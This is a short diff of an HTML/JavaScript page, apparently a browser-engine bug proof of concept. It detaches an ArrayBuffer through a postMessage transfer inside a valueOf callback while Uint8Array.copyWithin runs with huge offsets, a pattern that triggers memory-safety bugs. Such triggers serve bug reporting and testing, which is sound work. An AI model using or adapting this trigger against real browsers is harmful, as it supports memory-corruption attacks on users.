@@ -9,7 +9,7 @@ Result: "DATA_CLONE_ERR: DOM Exception 25" and in console: "TypeError: 'undefine
 <body>
 <script>
 
-f = new function(){
+function f(){
    try{
    alert("t");
    postMessage("test", "http://127.0.0.1", [q])
@@ -25,12 +25,14 @@ f = new function(){
 
 alert(Date);
 
-var q = new ArrayBuffer(0x2000);
-var o = {valueOf : f}
+var q = new ArrayBuffer(0x00FFFFFF);
+var o = {valueOf : f};
 var a = new Uint8Array(q);
 
   // alert(q.byteLength);
 var t = [];
+
+console.log(o);
 
 a.copyWithin(0x12345678, o, 0x32345678);
 
